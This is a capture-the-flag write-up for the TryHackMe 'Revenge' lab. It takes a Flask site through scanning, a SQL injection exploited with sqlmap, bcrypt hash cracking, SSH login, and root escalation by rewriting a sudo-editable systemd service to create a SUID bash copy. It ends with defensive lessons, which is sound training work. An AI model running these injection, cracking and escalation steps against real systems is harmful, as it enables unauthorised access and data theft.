---
title: "Revenge : TryHackMe"
last_modified_at: 2020-10-17ET14:40:02-05:00
categories:
  - TryHackMe
author_profile: false
tags:
  - SQL Injection
  - SQLMap
  - Privilege Escalation
  - linux 
  - TryHackMe
---


![/assets/images/TryHackMe/Revenge/Untitled.png](/assets/images/TryHackMe/Revenge/Untitled.png)

> You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?


# Summary

The webapp has SQLi vulnerablilty. In order to find the route, we need to find the [app.py](http://app.py) flask file which hosts the application. Then use SQLmap to get hash of serveradmin and gain access to system. Use the sudo permission on editing services to get root access.

# Nmap Scan

```bash
# nmap -sS -sC -A -T4 -o nmap 10.10.137.57
```

-sS : Syn Scan

-sC :  Default Script

-A : Version, OS detection, traceroute

-T4 : Multiple Threads

-o : Output

```bash
# Nmap 7.80 scan initiated Sat Oct 17 06:09:02 2020 as: nmap -sS -sC -A -T4 -o nmap 10.10.137.57
Nmap scan report for 10.10.137.57
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/17%OT=22%CT=1%CU=37016%PV=Y%DS=2%DC=T%G=Y%TM=5F8B09
OS:32%P=x86_64-pc-linux-gnu)SEQ(SP=F9%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=F9%GCD=1%ISR=102%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3
OS:=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F
OS:4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   184.04 ms 10.8.0.1
2   184.36 ms 10.10.137.57

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 17 06:09:38 2020 -- 1 IP address (1 host up) scanned in 36.76 seconds
```

So we have port 80 and port 22 . 

# Port 80

![/assets/images/TryHackMe/Revenge/Untitled%201.png](/assets/images/TryHackMe/Revenge/Untitled%201.png)

None of the links could be used. Then I fired up gobuster

```bash
$ gobuster dir -u 10.10.137.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,xml -t 25 -o gobust_root
```

-x : extension

dir : directory

-u : url

-w : wordlist

-t : threads

We get 

```bash
/index (Status: 200)
/contact (Status: 200)
/products (Status: 200)
/login (Status: 200)
/admin (Status: 200)
/static (Status: 301)
/requirements.txt (Status: 200)
```

requirements.txt looks different

Let's visit it

http://10.10.137.57/requirements.txt

```bash
attrs==19.3.0
bcrypt==3.1.7
cffi==1.14.1
click==7.1.2
Flask==1.1.2
Flask-Bcrypt==0.7.1
Flask-SQLAlchemy==2.4.4
itsdangerous==1.1.0
Jinja2==2.11.2
MarkupSafe==1.1.1
pycparser==2.20
PyMySQL==0.10.0
six==1.15.0
SQLAlchemy==1.3.18
Werkzeug==1.0.1
```

Which shows the application is running flask. So let's add py extension on our gobuster

```bash
$ gobuster dir -u 10.10.137.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,xml,py -t 25 -o gobust_root
```

Result

```bash
/index (Status: 200)
/contact (Status: 200)
/products (Status: 200)
/login (Status: 200)
/admin (Status: 200)
/static (Status: 301)
/app.py (Status: 200)
/requirements.txt (Status: 200)
```

Download [app.py](http://app.py) and view the content

```bash
$ wget 10.10.137.57/app.py
```

The file was hosting the routes. There were many functions on particular this function had a vulnerable code

```bash
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)
```

The route /products/<product_id> is used for dynamic url and. The user input product_id is directly used in the sql query. So this query must be exploitable. Using sqlmap

```bash
$ sqlmap -u http://10.10.137.57/products/1 --dbs
```

We get the databases

```bash
available databases [5]:                                                                                          
[*] duckyinc                                                                                                      [*] information_schema                                                                                            
[*] mysql                                                                                                         
[*] performance_schema                                                                                            
[*] sys
```

Lets extract data from ducky inc

```bash
$ sqlmap -u http://10.10.137.57/products/1 -D duckyinc --dump
```

Many tables were returned. One interesting table was `user`  and  `system-user`

User table had the first flag `thm{br***********1ng}`

```bash
----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+
```

So we have the hashes. Then I tried cracking the first hash using hashcat. Since it is 

```bash
bcrypt $2*$, Blowfish (Unix) with mode 3200
```

Stored the hash in the file hash and used hashcat

```bash
$  echo '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a' > hash
$  hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt 
We get the password : **inuyasha**
```

This password can be used to gain access to the system.

# Port 22

```bash
$ ssh server-admin@10.10.137.57
```

Inside the home directory we have the second flag

```bash
server-admin@duckyinc:~$ ls
flag2.txt
server-admin@duckyinc:~$ wc -c flag2.txt 
18 flag2.txt
```

Then I tried to access the root user. Viewing if the user server-admin can run some binary as root.

```bash
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart
        duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

We can see we can edit the duckyinc.service, enable, restart and start. Lets modify the service.

/etc/systemd/system/duckyinc.service

```bash
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

Lets change the user and group to root and exec start to a shell script we control and restart the service.

After editing

```bash
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /tmp/ro.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

Now lets create our exploit

/tmp/ro.sh

```bash
#!/bin/bash
cp /bin/bash /tmp/sh
chmod +s /tmp/sh
```

We first copy bash to /tmp and add suid bit. Since the service runs as root, root sets SUID to /tmp/bash and we can get root bash shell.

Since we edited the service we need to reload daemon and after restarting the script executes as root.

```bash
server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload 
server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
```

Now if we look at tmp

```bash
server-admin@duckyinc:~$ ls -l /tmp
total 2188
-rwxrwxr-x 1 server-admin server-admin      50 Oct 17 17:09 ro.sh
-rwsr-sr-x 1 root         root         1113504 Oct 17 17:09 sh
drwx------ 3 root         root            4096 Oct 17 16:33 systemd-private-1a2c5253ae074f08a28c3cbbb2b39b65-systemd-resolved.service-SrErBW
drwx------ 3 root         root            4096 Oct 17 16:33 systemd-private-1a2c5253ae074f08a28c3cbbb2b39b65-systemd-timesyncd.service-RhrpKF
```

```bash
$ /tmp/sh -p # p to preserve euid
sh-4.4# 
```

After this I serached for the last flag but could not find anywhere.

Hint says what is the mission, so lets edit the website.

```bash
$ nano /var/www/duckyinc/templates/index.html
```

Edit any line of this file . After editing , a new file is created in the root directory which is the final flag. `thm{m*******d}`

# What I learned

- Dont directly add user input to sql query. Very high potential of SQLi. Use prepared statements when running SQL queries.
- Don't allow users to create or modify service.